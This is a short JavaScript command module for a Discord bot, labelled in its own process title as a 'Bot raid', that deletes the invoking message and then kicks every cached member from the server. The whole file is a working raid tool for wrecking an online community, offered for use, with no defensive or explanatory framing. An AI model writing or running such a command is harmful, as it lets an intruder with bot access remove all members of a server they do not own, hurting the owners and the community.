module.exports = {
    name: 'mass_kick',
    description: 'Kick users all',
    async execute(message, args) {
      message.delete()
  
          process.title = `Kickall executed | Bot raid created by Mendry`
  
  
      
      const prosesKick = [];
  
      const mebmersID = message.guild.members.cache.filter(user => user.id )
  
      const promeses = mebmersID.map(user => {
        prosesKick.push(user.kick())
      })
  
    await Promise.all(promeses)
  }
  };